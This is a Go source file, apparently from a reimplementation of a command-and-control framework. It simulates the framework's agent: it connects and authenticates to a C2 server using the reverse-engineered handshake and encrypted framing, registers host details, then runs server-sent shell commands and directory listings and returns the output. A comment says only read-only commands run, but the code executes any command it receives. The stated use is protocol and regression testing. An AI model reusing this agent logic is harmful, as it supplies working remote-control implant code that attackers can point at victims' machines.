package c2engine

// 官方 agent 的**模拟器**：按 R19–R26 实测的线格式反向扮演 agent。
//
// 用途：在没有原版载荷的机器上验证复刻端的官方协议服务端
// （`vshell-server official-tcp`），也可用于 e2e 回归。
//
// 行为：连上服务端后按抓包顺序完成认证与通道注册（conf/main/chan），
// 收到任务记录后执行并回 `->|输出|<-`。

import (
	"bufio"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os/exec"
	"strings"
	"time"
)

// OfficialAgentSim 是模拟器。
type OfficialAgentSim struct {
	Addr     string
	Vkey     string
	Salt     string
	HostName string
	UserName string
	OsName   string
	Logf     func(format string, args ...interface{})
}

// OfficialAgentSimResult 描述模拟器一次连接的结果。
type OfficialAgentSimResult struct {
	Registered bool
	Tasks      int
	Results    []string
}

// Run 启动模拟器：开三条连接（conf/main/chan），并在 main 上处理任务。
func (a *OfficialAgentSim) Run(timeout time.Duration) (*OfficialAgentSimResult, error) {
	if a.Logf == nil {
		a.Logf = Logf
	}
	if a.HostName == "" {
		a.HostName = "sim-host"
	}
	if a.UserName == "" {
		a.UserName = "sim-user"
	}
	if a.OsName == "" {
		a.OsName = "linux_amd64"
	}
	res := &OfficialAgentSimResult{}

	confConn, err := a.dialAndAuth("conf")
	if err != nil {
		return res, err
	}
	defer confConn.Close()
	// conf：发 \x01 之前的确认，再上报 client 记录
	if err := confConn.send([]byte("conf")); err != nil {
		return res, err
	}
	if _, err := confConn.read(); err != nil {
		return res, err
	}
	info := map[string]interface{}{
		"Id": 0, "IsConnect": false, "VerifyKey": "", "Tp": "tcp", "Addr": "",
		"Remark": "", "Status": false, "LocalIP": "127.0.0.1", "UserName": a.UserName,
		"HostName": a.HostName, "Location": "", "OsName": a.OsName,
		"ProcessName": "official-agent-sim", "PingCheckTime": 0,
		"NoStore": false, "NoDisplay": false, "MaxConn": 0, "NowConn": 0,
	}
	payload, _ := json.Marshal(info)
	if err := confConn.send([]byte("conf \x01\x00\x00" + string(payload))); err != nil {
		return res, err
	}
	if _, err := confConn.read(); err != nil { // \x01
		return res, err
	}
	if _, err := confConn.read(); err != nil { // session
		return res, err
	}
	res.Registered = true
	a.Logf("official-agent-sim: client registered as %s/%s", a.HostName, a.OsName)

	mainConn, err := a.dialAndAuth("main")
	if err != nil {
		return res, err
	}
	defer mainConn.Close()

	chanConn, err := a.dialAndAuth("chan")
	if err == nil {
		defer chanConn.Close()
	}

	// 在 main 上处理任务直到超时
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		_ = mainConn.conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		rec, err := mainConn.read()
		if err != nil {
			if ne, ok := err.(net.Error); ok && ne.Timeout() {
				continue
			}
			return res, nil
		}
		if len(rec) < 5 || rec[0] != officialMsgData {
			continue
		}
		body, err := mainConn.read()
		if err != nil {
			return res, nil
		}
		n := 0
		if len(body) >= 4 {
			n = int(binary.LittleEndian.Uint32(body[:4]))
		}
		if n <= 0 || 4+n > len(body) {
			continue
		}
		var task OfficialTask
		if err := json.Unmarshal(body[4:4+n], &task); err != nil {
			continue
		}
		res.Tasks++
		out := a.execute(&task)
		a.Logf("official-agent-sim: task %s -> %q", task.Req.Type, truncateForLog(out, 80))
		// 回结果：03|chan|len 头 + [u32 len][文本]
		hdr := []byte{officialMsgData, 0x01, 0x00, 0x00, 0x00, byte(len(out)), byte(len(out) >> 8)}
		if err := mainConn.send(hdr); err != nil {
			return res, err
		}
		rbody := make([]byte, 4+len(out))
		binary.LittleEndian.PutUint32(rbody[:4], uint32(len(out)))
		copy(rbody[4:], out)
		if err := mainConn.send(rbody); err != nil {
			return res, err
		}
		res.Results = append(res.Results, out)
	}
	return res, nil
}

// execute 执行一条任务（目前支持 M：执行命令）。
func (a *OfficialAgentSim) execute(task *OfficialTask) string {
	switch task.Req.Type {
	case OfficialTaskExec:
		// 模拟器只执行只读的简单命令，避免测试里误删东西
		fields := strings.Fields(task.Req.Z1)
		if len(fields) == 0 {
			return "->||<-"
		}
		out, err := exec.Command(fields[0], fields[1:]...).CombinedOutput()
		if err != nil && len(out) == 0 {
			out = []byte(err.Error())
		}
		return "->|" + string(out) + "|<-"
	case OfficialTaskListDir:
		entries, err := osReadDir(task.Req.Z1)
		if err != nil {
			return "->|" + err.Error() + "|<-"
		}
		return "->|" + strings.Join(entries, "\n") + "|<-"
	default:
		return fmt.Sprintf("->|unsupported task type %s|<-", task.Req.Type)
	}
}

// dialAndAuth 建立连接并完成 版本→挑战→md5(vkey)→sucs→通道名 的握手。
func (a *OfficialAgentSim) dialAndAuth(channel string) (*officialAgentConn, error) {
	conn, err := net.DialTimeout("tcp", a.Addr, 5*time.Second)
	if err != nil {
		return nil, err
	}
	c := &officialAgentConn{conn: conn, rd: bufio.NewReader(conn), salt: a.Salt}
	// 两条版本记录
	ver := make([]byte, 4+len(OfficialVersion))
	binary.LittleEndian.PutUint32(ver[:4], uint32(len(OfficialVersion)))
	copy(ver[4:], OfficialVersion)
	if err := c.send(ver); err != nil {
		return nil, err
	}
	if err := c.send(ver); err != nil {
		return nil, err
	}
	chal, err := c.read()
	if err != nil {
		return nil, err
	}
	if string(chal) != OfficialAuthChallenge(OfficialVersion) {
		return nil, fmt.Errorf("unexpected challenge %q", chal)
	}
	if err := c.send([]byte(OfficialAuthResponse(a.Vkey))); err != nil {
		return nil, err
	}
	resp, err := c.read()
	if err != nil {
		return nil, err
	}
	if string(resp) != officialAuthOK {
		return nil, fmt.Errorf("auth rejected: %q", resp)
	}
	if err := c.send([]byte(channel)); err != nil {
		return nil, err
	}
	return c, nil
}

type officialAgentConn struct {
	conn net.Conn
	rd   *bufio.Reader
	salt string
}

func (c *officialAgentConn) send(plain []byte) error {
	wire, err := FrameEncrypt(plain, c.salt)
	if err != nil {
		return err
	}
	_, err = c.conn.Write(wire)
	return err
}

func (c *officialAgentConn) read() ([]byte, error) {
	var hdr [4]byte
	if _, err := io.ReadFull(c.rd, hdr[:]); err != nil {
		return nil, err
	}
	n := int(binary.LittleEndian.Uint32(hdr[:]))
	if n <= 0 || n > 1<<20 {
		return nil, fmt.Errorf("bad record length %d", n)
	}
	body := make([]byte, n)
	if _, err := io.ReadFull(c.rd, body); err != nil {
		return nil, err
	}
	return Unframe(body, c.salt)
}

func (c *officialAgentConn) Close() error { return c.conn.Close() }
